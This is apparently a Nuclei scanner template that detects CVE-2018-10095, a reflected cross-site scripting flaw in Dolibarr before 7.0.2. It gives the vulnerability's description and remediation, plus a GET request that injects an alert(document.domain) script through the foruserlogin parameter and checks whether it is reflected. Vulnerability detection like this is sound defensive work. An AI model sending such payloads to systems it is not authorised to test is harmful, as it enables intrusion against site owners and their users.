id: CVE-2018-10095

info:
  name: Dolibarr <7.0.2 - Cross-Site Scripting
  author: pikpikcu
  severity: medium
  description: |
    Dolibarr before 7.0.2  is vulnerable to cross-site scripting and allows remote attackers to inject arbitrary web script or HTML via the foruserlogin parameter to adherents/cartes/carte.php.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary script code in the context of the victim's browser, potentially leading to session hijacking, defacement, or theft of sensitive information.
  remediation: |
    Upgrade to Dolibarr version 7.0.2 or later to mitigate this vulnerability.
  reference:
    - https://sysdream.com/news/lab/2018-05-21-cve-2018-10095-dolibarr-xss-injection-vulnerability/
    - https://github.com/Dolibarr/dolibarr/commit/1dc466e1fb687cfe647de4af891720419823ed56
    - https://github.com/Dolibarr/dolibarr/blob/7.0.2/ChangeLog
    - https://nvd.nist.gov/vuln/detail/CVE-2018-10095
    - http://www.openwall.com/lists/oss-security/2018/05/21/3
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2018-10095
    cwe-id: CWE-79
    epss-score: 0.95296
    epss-percentile: 0.99346
    cpe: cpe:2.3:a:dolibarr:dolibarr:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: dolibarr
    product: dolibarr
  tags: cve2018,cve,xss,dolibarr

http:
  - method: GET
    path:
      - "{{BaseURL}}/dolibarr/adherents/cartes/carte.php?&mode=cardlogin&foruserlogin=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&model=5160&optioncss=print"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '</script><script>alert(document.domain)</script>'

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100aba08e6e9fb6496447afa2b99b38c8692dea9a87c1642635ed9d5df1b682594e022100bdda6d2d5f3c763d7add6cc7ec46857640304f99c9fee1d9637399e30f2c5319:922c64590222798bb761d5b6d8e72950